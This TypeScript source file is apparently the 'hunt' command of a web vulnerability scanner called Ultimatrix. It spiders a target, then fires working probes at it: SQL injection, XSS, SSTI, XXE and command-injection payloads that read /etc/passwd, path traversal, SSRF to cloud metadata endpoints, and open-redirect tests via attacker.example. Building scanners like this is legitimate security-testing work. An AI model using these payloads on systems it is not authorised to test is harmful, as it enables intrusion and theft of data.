// src/cli/hunt.ts
//
// The canonical `hunt` command. Collapses `assess` + `interact` + `test` into
// a single integrated flow:
//
//   1. Spider (depth 2)        — discover routes, forms, cookies, storage
//   2. Recon (parallel)        — OAuth / GraphQL / JWT / cloud / framework
//   3. v3 Orchestrator         — workflow DAG + multi-session RBAC
//      ├─ onBeforeNode hook    — prompt user (Y/s/i/d/a) per node
//      ├─ worker runner        — HandRolledWorkerRunner with probes
//      └─ chain engine         — heuristic chains after each finding
//   4. Ask: generate tests?    — FindingTestGenerator → playwright-tests/
//   5. Report                  — chain-first HTML + Mermaid
//
// Slash commands (in guided mode):
//   /auto /guided /findings /test /report /add <url> /help /quit
//
// Flags:
//   --target, -t         target URL (required)
//   --output, -o         output dir (default ./output)
//   --guided             step-by-step mode (default)
//   --auto               autonomous mode (no prompts)
//   --no-tests           skip Playwright test generation
//   --tests-dir <dir>    where to write Playwright tests (default playwright-tests)
//   --depth <n>          spider depth (default 2)
//   --max-runtime <s>    hard time limit in seconds (default 1800)
//   --no-chains          skip attack chain reasoning
//   --no-recon           skip recon layer
//   --no-spider          skip spider (use existing app-model.json)
//   --existing-model <p> path to existing app-model.json to resume from

import * as fs from 'fs';
import * as path from 'path';
import { randomUUID } from 'crypto';
import type { AppModel, AppModelFinding, AttackChain } from '../core/app-model';
import { readAppModel, writeAppModel, writeAppModelAsync, DEFAULT_MODEL, updateAppModelSection, compileReport } from '../core/app-model';
import { runRecon } from '../recon';
import { runChainEngine, runHeuristicChains } from '../core/attack-chain';
import { renderChainFirstReport, renderChainReportHtml } from '../core/chain-report';
import { generateFindingTests, writeFindingTests } from '../tools/finding-test-generator';
import { HuntPrompt, SLASH_HELP, type NodePromptAnswer, type HuntMode } from './prompt';
import { SpiderCrawler, type CrawlResult } from '../explorer/spider';
import { AutonomousV3Orchestrator, defaultNodeStrategy, type NodeStrategy, type NodeStrategyResolution, type WorkerSpawnInput, type WorkerSpawnResult } from '../pipeline/autonomous-v3';
import { WorkflowStateGraph, type WorkflowStateNode } from '../core/workflow-state';
import { SessionPool, getDefaultSessionPool } from '../core/session-pool';
import { getSharedBrowserManager } from '../tools/browser-tools';
import type { Hypothesis, Technique } from '../core/attack-plan';

import { parseHuntFlags as _parseHuntFlags, type HuntOptions } from './hunt-flags';
export { type HuntOptions } from './hunt-flags';
export function parseHuntFlags(args: string[]): HuntOptions { return _parseHuntFlags(args); }
export async function runHunt(opts: HuntOptions): Promise<void> {
  fs.mkdirSync(opts.outputDir, { recursive: true });
  const modelPath = path.join(opts.outputDir, 'app-model.json');
  const startedAt = Date.now();
  console.log(`\n\x1b[1;32m▸ Ultimatrix hunt\x1b[0m → ${opts.target}`);
  console.log(`  mode: ${opts.mode}, output: ${opts.outputDir}, max runtime: ${Math.round(opts.maxRuntimeMs / 1000)}s\n`);

  // Build the prompt (constructed with no-callback stubs to break the
  // self-reference; real callbacks are wired in after the prompt exists)
  const prompt: HuntPrompt = new HuntPrompt({
    onNodePrompt: async () => 'proceed' as NodePromptAnswer,
    onSlash: async () => '',
    onQuit: async () => { prompt.close(); process.exit(0); },
  });
  prompt.setMode(opts.mode);

  // 1. Spider
  let model: AppModel;
  if (opts.skipSpider && opts.existingModelPath && fs.existsSync(opts.existingModelPath)) {
    console.log(`[1/5] Loading existing model from ${opts.existingModelPath}…`);
    model = readAppModel(opts.existingModelPath);
  } else if (fs.existsSync(modelPath)) {
    console.log(`[1/5] Loading existing model from ${modelPath}…`);
    model = readAppModel(modelPath);
  } else {
    console.log(`[1/5] Spidering ${opts.target} (depth ${opts.depth})…`);
    const mgr = getSharedBrowserManager(true);
    const spider = new SpiderCrawler(mgr, 'default');
    const crawlResult: CrawlResult = await spider.crawl(opts.target, opts.depth, undefined, opts.outputDir);
    model = buildAppModelFromCrawl(crawlResult, opts.target);
    await writeAppModelAsync(modelPath, model);
    console.log(`  ↳ discovered ${crawlResult.visitedUrls.length} URLs, ${crawlResult.routes.length} routes`);
  }

  // 2. Recon
  if (!opts.skipRecon) {
    console.log(`[2/5] Running recon (OAuth / GraphQL / JWT / cloud / framework)…`);
    const reconResult = await runRecon({
      target: opts.target,
      appModelPath: modelPath,
      parallel: true,
    });
    const totalDiscovered = reconResult.oauthProviders + reconResult.graphqlEndpoints + reconResult.jwtTokens + reconResult.frameworks + reconResult.cloudProbes;
    console.log(`  ↳ ${totalDiscovered} discoveries in ${reconResult.durationMs}ms (errors: ${reconResult.errors.length})`);
    model = readAppModel(modelPath);
  } else {
    console.log(`[2/5] Recon skipped (--no-recon)`);
  }

  // 3. v3 Orchestrator
  console.log(`[3/5] Launching v3 orchestrator…`);
  const { graph, pool } = await buildWorkflowFromAppModel(model, opts);
  const findingsBefore = model.findings.length;
  let v3Findings: AppModelFinding[] = [];

  try {
    const orch = new AutonomousV3Orchestrator({
      graph,
      pool,
      appModel: model,
      strategy: defaultNodeStrategy,
      workerFactory: huntWorkerRunner,
      onFinding: (finding) => {
        v3Findings.push(finding);
        updateAppModelSection(modelPath, 'findings', [finding], true);
      },
      onBeforeNode: async (node, spec) => {
        if (!spec) return 'skip';
        const remaining = Math.max(0, opts.maxRuntimeMs - (Date.now() - startedAt));
        if (remaining < 5_000) {
          console.log(`\x1b[33m  ! Time budget exhausted, aborting\x1b[0m`);
          return 'abort';
        }
        const answer = await prompt.promptNode({
          id: node.id,
          url: node.url,
          method: spec.method,
          technique: spec.technique,
          expectedSeverity: spec.expectedSeverity,
        });
        if (answer === 'skip') return 'skip';
        if (answer === 'abort') return 'abort';
        if (answer === 'add') {
          const url = (await prompt.ask('  URL to add: ')).trim();
          if (url) {
            const m = readAppModel(modelPath);
            m.visitedUrls = [...(m.visitedUrls || []), url];
            await writeAppModelAsync(modelPath, m);
          }
          return 'skip';
        }
        return 'proceed';
      },
      maxRuntimeMs: opts.maxRuntimeMs,
      maxNodes: opts.maxNodes ?? 50,
      enableConcurrency: true,
      maxConcurrency: 4,
      sleepBetweenNodesMs: 0,
    });
    await orch.run();
  } finally {
    await pool.closeAll();
  }

  model = readAppModel(modelPath);
  const findingsAfter = model.findings.length - findingsBefore;
  console.log(`  ↳ ${findingsAfter} new findings (${model.findings.length} total)`);

  // 4. Chain engine (if not skipped)
  if (!opts.skipChains && model.findings.length > 0) {
    console.log(`[4/5] Running attack chain engine (heuristic)…`);
    const newChains: AttackChain[] = runHeuristicChains(model.findings, 'low');
    const existing = model.attackChains || [];
    model.attackChains = mergeChains(existing, newChains);
    await writeAppModelAsync(modelPath, model);
    const critical = model.attackChains.filter(c => c.severity === 'critical' || c.severity === 'high').length;
    console.log(`  ↳ ${newChains.length} new chains (${critical} critical/high, ${model.attackChains.length} total)`);
  } else {
    console.log(`[4/5] Chain engine skipped`);
  }

  // 5. Playwright test generation
  if (!opts.skipTests && model.findings.length > 0) {
    if (opts.mode === 'guided') {
      const ans = (await prompt.ask('  Generate Playwright regression tests? [Y/n]: ')).trim().toLowerCase();
      if (ans === '' || ans === 'y' || ans === 'yes') {
        await generateAndWriteTests(model, opts, modelPath);
      } else {
        console.log(`[5/5] Skipped test generation`);
      }
    } else {
      await generateAndWriteTests(model, opts, modelPath);
    }
  } else if (model.findings.length === 0) {
    console.log(`[5/5] No findings — skipping test generation`);
  } else {
    console.log(`[5/5] Test generation skipped (--no-tests)`);
  }

  // 6. Report
  console.log(`[6/6] Compiling report…`);
  const sections = renderChainFirstReport(model);
  const htmlPath = path.join(opts.outputDir, 'report.html');
  fs.writeFileSync(htmlPath, renderChainReportHtml(sections), 'utf-8');
  const mdPath = path.join(opts.outputDir, 'report.md');
  fs.writeFileSync(mdPath, compileReport(model, 'markdown'), 'utf-8');
  console.log(`  ↳ report.html, report.md written to ${opts.outputDir}`);
  console.log(`\n\x1b[1;32m✓ Hunt complete in ${Math.round((Date.now() - startedAt) / 1000)}s\x1b[0m`);
  console.log(`  findings: ${model.findings.length}  chains: ${(model.attackChains || []).length}`);
  console.log(`  report:   ${htmlPath}\n`);
}

function buildAppModelFromCrawl(crawl: CrawlResult, target: string): AppModel {
  const model: AppModel = JSON.parse(JSON.stringify(DEFAULT_MODEL));
  model.target = target;
  model.visitedUrls = crawl.visitedUrls;
  // Map routes → endpoints
  for (const route of crawl.routes) {
    model.endpoints.push({
      path: route.url,
      method: 'GET',
      responseStatus: 200,
      contentType: 'text/html',
      requiresAuth: false,
      bodyPreview: '',
      params: [],
    });
  }
  return model;
}

async function buildWorkflowFromAppModel(
  model: AppModel,
  opts: HuntOptions,
): Promise<{ graph: WorkflowStateGraph; pool: SessionPool }> {
  const graph = new WorkflowStateGraph();
  const origin = new URL(opts.target).origin;
  const seen = new Set<string>();
  const addedIds: string[] = [];

  const add = (url: string, isApi: boolean) => {
    if (seen.has(url)) return;
    seen.add(url);
    const node = graph.addNode({
      id: randomUUID(),
      url,
      title: url,
      type: isApi ? 'api' : 'page',
      authRequired: false,
      authVerified: false,
      discoveredFrom: null,
      discoveryMethod: 'navigation',
    });
    addedIds.push(node.id);
  };

  // Seed from explicit --seed-urls (if provided)
  for (const url of (opts.seedUrls || [])) {
    const fullUrl = url.startsWith('http') ? url : `${origin}${url}`;
    const isApi = fullUrl.includes('/api/') || fullUrl.includes('/graphql') || fullUrl.includes('/oauth') || fullUrl.includes('/.well-known') || /\/v\d+\//.test(fullUrl);
    add(fullUrl, isApi);
  }

  // Seed from the spider's discovered URLs
  for (const url of (model.visitedUrls || [])) {
    const isApi = url.includes('/api/') || /\/v\d+\//.test(url) || url.includes('/graphql') || url.includes('/oauth') || url.includes('/.well-known');
    add(url, isApi);
  }

  // Seed from the discovered endpoints
  for (const ep of (model.endpoints || [])) {
    const fullUrl = ep.path.startsWith('http') ? ep.path : `${origin}${ep.path}`;
    add(fullUrl, ep.method?.toUpperCase() !== 'GET' || ep.path.includes('/api/') || ep.path.includes('/graphql'));
  }

  // FALLBACK: if the graph is empty, seed with the target root
  if (seen.size === 0) {
    console.log(`  ↳ workflow graph empty — seeding with target root`);
    add(opts.target, false);
  }

  // Mark all seeded nodes as reachable so the orchestrator processes them
  for (const id of addedIds) graph.markReachable(id);
  console.log(`  ↳ workflow graph: ${addedIds.length} reachable nodes`);

  const pool = getDefaultSessionPool();
  try { pool.switchTo('default'); } catch { /* ignore */ }
  return { graph, pool };
}

async function huntWorkerRunner(input: WorkerSpawnInput): Promise<WorkerSpawnResult> {
  const start = Date.now();
  const url = input.url;
  const method = (input.method || 'GET').toUpperCase();
  const param = input.param;
  const technique = input.technique;
  dlog(`technique=${technique} url=${url} method=${method} param=${param}`);

  // Default low-privilege test creds. Workers that need auth (oauth-probes,
  // race) accept these. Real apps would pass via the pool/session.
  const cookies: Record<string, string> = { auth: 'user' };

  try {
    // Dispatch by technique to the real hand-rolled probe.
    switch (technique) {
      case 'ssrf': {
        const { probeCloudMetadata } = await import('../agents/specialists/cloud-probes');
        const targetOrigin = new URL(url).origin;
        const results = await probeCloudMetadata({
          target: targetOrigin,
          ssrfSurfacePath: url,
          ssrfParamName: param || 'url',
          cookies,
          timeoutMs: 10_000,
        });
        const hit = results.find(r => r.status === 'leaked');
        if (hit) {
          return {
            vulnerable: true,
            confidence: 0.95,
            evidence: [{
              type: 'screenshot',
              data: `Cloud metadata reachable: provider=${hit.provider} vector=${hit.vector} severity=${hit.severity}`,
              label: 'cloud-metadata-ssrf',
              timestamp: Date.now(),
            }, {
              type: 'raw_response',
              data: hit.responseSnippet,
              label: 'cloud-metadata-response',
              timestamp: Date.now(),
            }],
            payloads: [`http://169.254.169.254/latest/meta-data/`, `http://metadata.google.internal/`],
            summary: `SSRF → ${hit.provider} cloud metadata leaked via ${url}`,
            technique,
            url,
            durationMs: Date.now() - start,
          };
        }
        break;
      }

      case 'open-redirect': {
        // Probe OAuth redirect_uri prefix bypass + generic open-redirect
        if (url.includes('/oauth/') || url.includes('redirect_uri')) {
          const { runAllOAuthProbes } = await import('../agents/specialists/oauth');
          const targetOrigin = new URL(url).origin;
          const probeResult = await runAllOAuthProbes({
            target: targetOrigin,
            provider: {
              authorizationEndpoint: url,
              tokenEndpoint: `${targetOrigin}/oauth/token`,
              clientIds: ['test-client'],
            },
            attackerHost: 'attacker.example',
            cookies,
            timeoutMs: 10_000,
          });
          const hit = probeResult.results.find(p => p.vulnerable);
          if (hit) {
            return {
              vulnerable: true,
              confidence: 0.9,
              evidence: [{
                type: 'raw_response',
                data: `${hit.technique}: ${hit.responseSummary || ''}`,
                label: 'oauth-bypass',
                timestamp: Date.now(),
              }],
              payloads: hit.payload ? [hit.payload] : [],
              summary: `OAuth ${hit.technique} via ${url}`,
              technique: 'open-redirect',
              url,
              durationMs: Date.now() - start,
            };
          }
        }
        // Generic open-redirect: send param with absolute URL
        if (param) {
          const r = await testOpenRedirect(url, param, method, cookies);
          if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
        }
        break;
      }

      case 'race': {
        const { probeRaceCondition } = await import('../agents/specialists/race-probes');
        const path = new URL(url).pathname + new URL(url).search;
        const result = await probeRaceCondition({
          target: new URL(url).origin,
          endpoint: { path, method: method as any, body: undefined },
          headers: cookiesToHeader(cookies),
          parallel: 8,
          timeoutMs: 10_000,
        });
        if (result.vulnerable) {
          return {
            vulnerable: true,
            confidence: 0.85,
            evidence: [{
              type: 'raw_response',
              data: `Race: ${result.technique}, ${result.successCount}/${result.totalCount} succeeded\n${result.responseSummary || ''}`,
              label: 'race-condition',
              timestamp: Date.now(),
            }],
            payloads: result.payload ? [result.payload] : [],
            summary: `Race condition on ${url}: ${result.successCount}/${result.totalCount} parallel requests succeeded`,
            technique,
            url,
            durationMs: Date.now() - start,
          };
        }
        break;
      }

      case 'sqli': {
        const r = await testSqli(url, param || 'q', method, cookies);
        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
        break;
      }

      case 'xss': {
        const r = await testXss(url, param || 'q', method, cookies);
        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
        break;
      }

      case 'ssti': {
        const r = await testSsti(url, param || 'template', method, cookies);
        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
        break;
      }

      case 'idor': {
        const r = await testIdor(url, cookies);
        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
        break;
      }

      case 'xxe': {
        const r = await testXxe(url, method, cookies);
        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
        break;
      }

      case 'path': {
        // Path traversal via path-traversal payload
        const r = await testPathTraversal(url, method, cookies);
        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
        break;
      }

      case 'cmd': {
        const r = await testCmdInjection(url, param || 'cmd', method, cookies);
        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
        break;
      }
    }
  } catch (e) {
    return {
      vulnerable: false,
      confidence: 0,
      evidence: [],
      payloads: [],
      summary: `Worker error: ${(e as Error).message}`,
      technique,
      url,
      error: (e as Error).message,
      durationMs: Date.now() - start,
    };
  }

  return {
    vulnerable: false,
    confidence: 0,
    evidence: [],
    payloads: [],
    summary: `${technique} @ ${url}: no vulnerability found`,
    technique,
    url,
    durationMs: Date.now() - start,
  };
}

// `verbose` flag to debug: set to true to log every probe attempt to stderr
const HUNT_DEBUG = process.env.HUNT_DEBUG === '1';
function dlog(...args: any[]): void {
  if (HUNT_DEBUG) console.error('[worker]', ...args);
}

// ── Real probe helpers (hand-rolled, deterministic, no LLM) ──

interface ProbeHit { vulnerable: boolean; confidence: number; evidence: any[]; payloads: string[]; summary: string; }

async function testOpenRedirect(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
  const payload = `https://attacker.example/`;
  const r = await fetch(url, {
    method,
    headers: { ...cookiesToHeader(cookies) },
    redirect: 'manual',
  });
  // Re-issue with payload
  const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(payload)}` : `${url}?${param}=${encodeURIComponent(payload)}`;
  const r2 = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) }, redirect: 'manual' });
  if (r2.status >= 300 && r2.status < 400) {
    const loc = r2.headers.get('location') || '';
    if (loc.includes('attacker.example')) {
      return {
        vulnerable: true, confidence: 0.9, payloads: [payload],
        evidence: [{ type: 'response', data: `Location: ${loc}`, label: 'open-redirect', timestamp: Date.now() }],
        summary: `Open redirect: ${param} → attacker URL`,
      };
    }
  }
  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no redirect' };
}

async function testSqli(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
  const payloads = [`' OR '1'='1`, `' OR 1=1--`, `1' AND '1'='1`, `' UNION SELECT 1,2,3--`];
  // Get baseline response first
  const baseline = await fetch(url, { method, headers: { ...cookiesToHeader(cookies) } });
  const baselineBody = await baseline.text();
  const baselineLen = baselineBody.length;
  for (const payload of payloads) {
    const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(payload)}` : `${url}?${param}=${encodeURIComponent(payload)}`;
    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
    const body = await r.text();
    // Real SQL error signatures (specific to SQL engines, not generic 500s)
    const sqlError = /\b(sql|mysql|postgresql|postgres|sqlite|ora-\d+|syntax error|unterminated|microsoft ole db|odbc sql|you have an error in your sql syntax|sqlexception|sqldriver)\b/i.test(body);
    // Boolean-based: response changed significantly with payload vs baseline
    const booleanBased = Math.abs(body.length - baselineLen) > 50;
    if (sqlError) {
      return {
        vulnerable: true, confidence: 0.9, payloads: [payload],
        evidence: [{ type: 'raw_response', data: body.slice(0, 500), label: 'sqli', timestamp: Date.now() }],
        summary: `SQLi via ${param}: ${payload.slice(0, 30)}`,
      };
    }
    if (booleanBased && r.status === 200) {
      return {
        vulnerable: true, confidence: 0.7, payloads: [payload],
        evidence: [{
          type: 'raw_response',
          data: `Baseline length: ${baselineLen}, payload length: ${body.length}`,
          label: 'sqli-boolean',
          timestamp: Date.now(),
        }],
        summary: `SQLi (boolean-based) via ${param}: payload changes response size by ${body.length - baselineLen} bytes`,
      };
    }
  }
  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no SQLi' };
}

async function testXss(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
  const payload = `<script>ultimatrixXss${Date.now()}</script>`;
  const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(payload)}` : `${url}?${param}=${encodeURIComponent(payload)}`;
  const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
  const body = await r.text();
  // Check if payload reflected unescaped
  if (body.includes(payload) || (body.includes('<script>ultimatrixXss') && !body.includes('&lt;script&gt;'))) {
    return {
      vulnerable: true, confidence: 0.95, payloads: [payload],
      evidence: [{ type: 'response', data: body.slice(0, 1000), label: 'xss', timestamp: Date.now() }],
      summary: `XSS via ${param}: payload reflected unescaped`,
    };
  }
  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no XSS' };
}

async function testSsti(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
  const payloads = [
    { p: '{{7*7}}', check: '49' },
    { p: '${7*7}', check: '49' },
    { p: '<%= 7*7 %>', check: '49' },
  ];
  for (const { p, check } of payloads) {
    const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(p)}` : `${url}?${param}=${encodeURIComponent(p)}`;
    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
    const body = await r.text();
    if (body.includes(check)) {
      return {
        vulnerable: true, confidence: 0.95, payloads: [p],
        evidence: [{ type: 'response', data: body.slice(0, 500), label: 'ssti', timestamp: Date.now() }],
        summary: `SSTI via ${param}: ${p}`,
      };
    }
  }
  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no SSTI' };
}

async function testIdor(url: string, cookies: Record<string, string>): Promise<ProbeHit> {
  // Try sequential IDs
  const r1 = await fetch(url, { headers: { ...cookiesToHeader(cookies) } });
  const b1 = await r1.text();
  for (let id = 1; id <= 5; id++) {
    const replaced = url.replace(/\/\d+(?=\/?$|\?)/, `/${id}`).replace(/\/api\/users\/[^/?]+/, `/api/users/${id}`);
    if (replaced === url) continue;
    const r = await fetch(replaced, { headers: { ...cookiesToHeader(cookies) } });
    if (r.status === 200 && r.headers.get('content-type')?.includes('json')) {
      const b = await r.text();
      if (b !== b1 && b.length > 0) {
        return {
          vulnerable: true, confidence: 0.8, payloads: [replaced],
          evidence: [{ type: 'response', data: b.slice(0, 500), label: 'idor', timestamp: Date.now() }],
          summary: `IDOR: ${replaced} returns different data than ${url}`,
        };
      }
    }
  }
  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no IDOR' };
}

async function testXxe(url: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
  if (method.toUpperCase() !== 'POST') return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'XXE only on POST' };
  const payload = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>`;
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/xml', ...cookiesToHeader(cookies) },
    body: payload,
  });
  const body = await r.text();
  if (body.includes('root:') || body.includes('/bin/')) {
    return {
      vulnerable: true, confidence: 0.95, payloads: [payload],
      evidence: [{ type: 'response', data: body.slice(0, 500), label: 'xxe', timestamp: Date.now() }],
      summary: `XXE: /etc/passwd leaked via ${url}`,
    };
  }
  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no XXE' };
}

async function testPathTraversal(url: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
  const payloads = [`../../../etc/passwd`, `....//....//....//etc/passwd`, `..%2f..%2f..%2fetc%2fpasswd`];
  for (const p of payloads) {
    const u = url.includes('?') ? `${url}&file=${encodeURIComponent(p)}` : `${url}?file=${encodeURIComponent(p)}`;
    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
    const body = await r.text();
    if (body.includes('root:') || body.includes('/bin/')) {
      return {
        vulnerable: true, confidence: 0.95, payloads: [p],
        evidence: [{ type: 'response', data: body.slice(0, 500), label: 'path-traversal', timestamp: Date.now() }],
        summary: `Path traversal: ${p}`,
      };
    }
  }
  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no path traversal' };
}

async function testCmdInjection(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
  const payloads = [`; ls`, `| cat /etc/passwd`, `$(cat /etc/passwd)`, `; cat /etc/passwd`];
  for (const p of payloads) {
    const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(p)}` : `${url}?${param}=${encodeURIComponent(p)}`;
    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
    const body = await r.text();
    if (body.includes('root:') || body.includes('bin/') || body.includes('total ') || body.includes('uid=')) {
      return {
        vulnerable: true, confidence: 0.95, payloads: [p],
        evidence: [{ type: 'response', data: body.slice(0, 500), label: 'cmd-injection', timestamp: Date.now() }],
        summary: `Command injection via ${param}: ${p}`,
      };
    }
  }
  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no cmd injection' };
}

function cookiesToHeader(cookies: Record<string, string>): Record<string, string> {
  const cookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
  return cookieStr ? { cookie: cookieStr } : {};
}

function mergeChains(existing: AttackChain[], fresh: AttackChain[]): AttackChain[] {
  const seen = new Set(existing.map(c => c.id));
  return [...existing, ...fresh.filter(c => !seen.has(c.id))];
}

async function generateAndWriteTests(model: AppModel, opts: HuntOptions, _modelPath: string): Promise<void> {
  const result = generateFindingTests(model, {
    outDir: opts.testsDir,
    includeChainTests: true,
  });
  const written = writeFindingTests(result, opts.testsDir);
  console.log(`  ↳ wrote ${written.length} files to ${opts.testsDir} (${result.findingsWritten} finding tests, ${result.chainsWritten} chain tests)`);
}

async function handleSlash(
  cmd: string,
  args: string[],
  opts: HuntOptions,
  modelPath: string,
  prompt: HuntPrompt,
): Promise<string> {
  switch (cmd) {
    case 'auto': prompt.setMode('auto'); return 'Mode → auto';
    case 'guided': prompt.setMode('guided'); return 'Mode → guided';
    case 'findings': {
      const m = readAppModel(modelPath);
      if (m.findings.length === 0) return 'No findings yet.';
      return m.findings
        .map(f => `  [${f.severity.toUpperCase()}] ${f.type} @ ${f.endpoint} (param: ${f.param || '-'}) conf=${f.confidence}`)
        .join('\n');
    }
    case 'test': {
      const m = readAppModel(modelPath);
      await generateAndWriteTests(m, opts, modelPath);
      return 'Tests generated.';
    }
    case 'report': {
      const m = readAppModel(modelPath);
      const sections = renderChainFirstReport(m);
      const htmlPath = path.join(opts.outputDir, 'report.html');
      fs.writeFileSync(htmlPath, renderChainReportHtml(sections), 'utf-8');
      return `Report written to ${htmlPath}`;
    }
    case 'add': {
      const url = args[0];
      if (!url) return 'Usage: /add <url>';
      const m = readAppModel(modelPath);
      m.visitedUrls = [...(m.visitedUrls || []), url];
      await writeAppModelAsync(modelPath, m);
      return `Added ${url} to the workflow graph`;
    }
    case 'help': return SLASH_HELP;
    case 'quit': case 'exit': case 'q':
      prompt.close();
      process.exit(0);
      return ''; // unreachable
    default:
      return `Unknown command: /${cmd}. Try /help.`;
  }
}
